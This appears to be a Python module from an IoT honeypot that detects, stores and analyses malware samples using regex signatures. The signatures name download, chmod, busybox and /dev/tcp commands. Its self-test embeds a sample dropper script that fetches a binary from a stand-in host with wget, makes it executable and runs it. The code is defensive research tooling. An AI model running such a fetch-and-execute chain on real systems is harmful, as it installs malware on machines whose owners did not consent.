#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Malware handling for the IoT Honeypot.
Provides functionality for detecting, capturing, and analyzing malware.
"""

import os
import re
import json
import hashlib
import logging
import time
from typing import Dict, Any, List, Optional, Tuple, Set

# Import core modules
from ..core.logger import get_event_logger
from ..core.config import get_config_manager

# Configure logging
logger = logging.getLogger("honeypot.security")

class MalwareHandler:
    """Malware handler for the IoT Honeypot."""
    
    def __init__(self, capture_dir: str = "captures"):
        """
        Initialize the malware handler.
        
        Args:
            capture_dir: Directory for storing captured files
        """
        self.capture_dir = capture_dir
        self.event_logger = get_event_logger()
        self.config_manager = get_config_manager()
        
        # Get security configuration
        security_config = self.config_manager.get_security_config()
        
        # Maximum file size to capture (bytes)
        self.max_file_size = security_config.get("max_file_size", 1048576)  # 1MB default
        
        # Signature file
        self.signature_file = security_config.get("signature_file", "security/signatures.json")
        
        # Load signatures
        self.signatures = self._load_signatures()
        
        # Create capture directory if it doesn't exist
        os.makedirs(self.capture_dir, exist_ok=True)
        
        # Set of captured file hashes to avoid duplicates
        self.captured_hashes = set()
        
        # Load existing hashes
        self._load_existing_hashes()
    
    def _load_signatures(self) -> Dict[str, Any]:
        """
        Load malware signatures from file.
        
        Returns:
            Dictionary of signatures
        """
        signatures = {
            "patterns": [
                # Common shell commands used in IoT malware
                r"(?:wget|curl)\s+(?:http|ftp|https)://",  # Download commands
                r"chmod\s+[0-9]+\s+",                      # Chmod commands
                r"(?:cat|dd)\s+>\s+/",                     # File writing to system directories
                r"(?:\/bin\/busybox|\/bin\/sh)\s+",        # Busybox/shell execution
                r"\/dev\/(?:tcp|udp)\/",                   # Network device access
                
                # Common IoT malware strings
                r"(?:mirai|gafgyt|tsunami|qbot|hajime)",   # Known malware names
                r"(?:botnet|ddos|flood)",                  # Attack-related terms
                
                # Binary patterns (hex encoded)
                r"\\x7f\\x45\\x4c\\x46",                   # ELF header
            ],
            "file_extensions": [
                ".sh", ".bin", ".elf", ".arm", ".mips", ".mpsl", ".x86", ".i686", ".ppc", 
                ".m68k", ".sh4", ".spc", ".arc", ".bot"
            ],
            "ip_blocklist": []  # Would contain known malicious IPs
        }
        
        # Try to load signatures from file
        if os.path.exists(self.signature_file):
            try:
                with open(self.signature_file, 'r') as f:
                    loaded_signatures = json.load(f)
                    
                    # Merge with default signatures
                    for key, value in loaded_signatures.items():
                        if key in signatures and isinstance(value, list):
                            signatures[key].extend(value)
                        else:
                            signatures[key] = value
                    
                logger.info(f"Loaded {len(signatures['patterns'])} signature patterns from {self.signature_file}")
            except Exception as e:
                logger.error(f"Error loading signatures: {e}")
        else:
            # Create default signature file
            os.makedirs(os.path.dirname(self.signature_file), exist_ok=True)
            
            try:
                with open(self.signature_file, 'w') as f:
                    json.dump(signatures, f, indent=2)
                
                logger.info(f"Created default signature file at {self.signature_file}")
            except Exception as e:
                logger.error(f"Error creating signature file: {e}")
        
        return signatures
    
    def _load_existing_hashes(self) -> None:
        """Load hashes of existing captured files."""
        if not os.path.exists(self.capture_dir):
            return
        
        # Load hash file if it exists
        hash_file = os.path.join(self.capture_dir, "hashes.json")
        if os.path.exists(hash_file):
            try:
                with open(hash_file, 'r') as f:
                    self.captured_hashes = set(json.load(f))
                
                logger.info(f"Loaded {len(self.captured_hashes)} existing file hashes")
            except Exception as e:
                logger.error(f"Error loading existing hashes: {e}")
    
    def _save_hashes(self) -> None:
        """Save captured file hashes to file."""
        hash_file = os.path.join(self.capture_dir, "hashes.json")
        
        try:
            with open(hash_file, 'w') as f:
                json.dump(list(self.captured_hashes), f)
        except Exception as e:
            logger.error(f"Error saving hashes: {e}")
    
    def detect_malware(self, data: bytes, source_ip: str = None) -> bool:
        """
        Detect if data contains potential malware.
        
        Args:
            data: Data to check
            source_ip: Source IP address
            
        Returns:
            True if potential malware is detected, False otherwise
        """
        # Check if data is too large
        if len(data) > self.max_file_size:
            logger.warning(f"Data too large to analyze: {len(data)} bytes")
            return False
        
        # Check if data is empty
        if not data:
            return False
        
        # Check IP blocklist
        if source_ip and source_ip in self.signatures.get("ip_blocklist", []):
            logger.info(f"Detected known malicious IP: {source_ip}")
            return True
        
        # Convert data to string for pattern matching
        try:
            data_str = data.decode('utf-8', errors='ignore')
        except:
            data_str = str(data)
        
        # Check for known patterns
        for pattern in self.signatures.get("patterns", []):
            if re.search(pattern, data_str, re.IGNORECASE):
                logger.info(f"Detected potential malware: matched pattern {pattern}")
                return True
        
        # Check for known file extensions in the data
        for ext in self.signatures.get("file_extensions", []):
            if ext in data_str:
                logger.info(f"Detected potential malware: contains file extension {ext}")
                return True
        
        return False
    
    def capture_file(self, data: bytes, source_ip: str, protocol: str) -> Optional[str]:
        """
        Capture a file for analysis.
        
        Args:
            data: File data
            source_ip: Source IP address
            protocol: Protocol
            
        Returns:
            File hash if captured, None otherwise
        """
        # Check if data is too large
        if len(data) > self.max_file_size:
            logger.warning(f"File too large to capture: {len(data)} bytes")
            return None
        
        # Calculate file hash
        file_hash = hashlib.sha256(data).hexdigest()
        
        # Check if file has already been captured
        if file_hash in self.captured_hashes:
            logger.info(f"File already captured: {file_hash}")
            return file_hash
        
        # Create timestamp
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        
        # Create filename
        filename = f"{timestamp}_{source_ip}_{protocol}_{file_hash[:8]}.bin"
        file_path = os.path.join(self.capture_dir, filename)
        
        # Save file
        try:
            with open(file_path, 'wb') as f:
                f.write(data)
            
            # Add to captured hashes
            self.captured_hashes.add(file_hash)
            self._save_hashes()
            
            # Log capture
            self.event_logger.log_malware(source_ip, protocol, file_hash, {
                "filename": filename,
                "size": len(data),
                "timestamp": timestamp
            })
            
            logger.info(f"Captured file: {filename} ({len(data)} bytes)")
            
            return file_hash
        except Exception as e:
            logger.error(f"Error capturing file: {e}")
            return None
    
    def analyze_file(self, file_hash: str) -> Dict[str, Any]:
        """
        Perform basic analysis on a captured file.
        
        Args:
            file_hash: Hash of the file to analyze
            
        Returns:
            Analysis results
        """
        # Find file by hash
        file_path = None
        for filename in os.listdir(self.capture_dir):
            if file_hash in filename and os.path.isfile(os.path.join(self.capture_dir, filename)):
                file_path = os.path.join(self.capture_dir, filename)
                break
        
        if not file_path:
            logger.error(f"File not found for hash: {file_hash}")
            return {"error": "File not found"}
        
        # Basic analysis results
        results = {
            "file_hash": file_hash,
            "file_path": file_path,
            "file_size": os.path.getsize(file_path),
            "timestamp": time.ctime(os.path.getctime(file_path)),
            "file_type": "unknown",
            "strings": [],
            "potential_commands": []
        }
        
        try:
            # Read file
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # Check file type
            if data.startswith(b'\x7fELF'):
                results["file_type"] = "ELF binary"
            elif data.startswith(b'#!/bin/sh') or data.startswith(b'#!/bin/bash'):
                results["file_type"] = "Shell script"
            elif data.startswith(b'MZ'):
                results["file_type"] = "Windows executable"
            
            # Extract strings
            strings = re.findall(b'[\x20-\x7E]{4,}', data)
            results["strings"] = [s.decode('utf-8', errors='ignore') for s in strings[:100]]  # Limit to 100 strings
            
            # Look for potential commands
            command_patterns = [
                r'(?:wget|curl)\s+(?:http|ftp|https)://.+',
                r'chmod\s+[0-9]+\s+.+',
                r'(?:\/bin\/busybox|\/bin\/sh)\s+.+',
                r'(?:cat|echo)\s+.+>\s+.+'
            ]
            
            for string in results["strings"]:
                for pattern in command_patterns:
                    if re.search(pattern, string):
                        results["potential_commands"].append(string)
            
            # Remove duplicates
            results["potential_commands"] = list(set(results["potential_commands"]))
            
            logger.info(f"Analyzed file: {file_hash} ({results['file_type']})")
            
            return results
        except Exception as e:
            logger.error(f"Error analyzing file: {e}")
            return {"error": str(e)}
    
    def get_captured_files(self) -> List[Dict[str, Any]]:
        """
        Get list of captured files.
        
        Returns:
            List of captured file information
        """
        files = []
        
        if not os.path.exists(self.capture_dir):
            return files
        
        for filename in os.listdir(self.capture_dir):
            if filename == "hashes.json":
                continue
            
            file_path = os.path.join(self.capture_dir, filename)
            if os.path.isfile(file_path):
                # Parse filename
                parts = filename.split('_')
                if len(parts) >= 4:
                    timestamp = parts[0]
                    source_ip = parts[1]
                    protocol = parts[2]
                    hash_part = parts[3].split('.')[0]
                    
                    files.append({
                        "filename": filename,
                        "timestamp": timestamp,
                        "source_ip": source_ip,
                        "protocol": protocol,
                        "hash": hash_part,
                        "size": os.path.getsize(file_path)
                    })
        
        # Sort by timestamp (newest first)
        files.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
        
        return files

# Singleton instance
_malware_handler = None

def get_malware_handler(capture_dir: Optional[str] = None) -> MalwareHandler:
    """
    Get the singleton MalwareHandler instance.
    
    Args:
        capture_dir: Directory for storing captured files
        
    Returns:
        MalwareHandler instance
    """
    global _malware_handler
    
    if _malware_handler is None:
        _malware_handler = MalwareHandler(capture_dir)
    
    return _malware_handler

# For direct testing
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    # Create necessary directories
    import os
    os.makedirs("logs", exist_ok=True)
    os.makedirs("captures", exist_ok=True)
    
    # Test malware handler
    handler = get_malware_handler("captures")
    
    # Test malware detection
    test_data = b"""#!/bin/sh
wget http://malicious.example.com/malware.bin
chmod 777 malware.bin
./malware.bin
"""
    
    is_malware = handler.detect_malware(test_data, "192.168.1.100")
    print(f"Malware detection result: {is_malware}")
    
    # Test file capture
    file_hash = handler.capture_file(test_data, "192.168.1.100", "telnet")
    print(f"Captured file hash: {file_hash}")
    
    # Test file analysis
    if file_hash:
        analysis = handler.analyze_file(file_hash)
        print("Analysis results:")
        print(json.dumps(analysis, indent=2))
    
    # Test getting captured files
    files = handler.get_captured_files()
    print(f"Captured files: {len(files)}")
    for file in files:
        print(f"- {file['filename']} ({file['size']} bytes)")
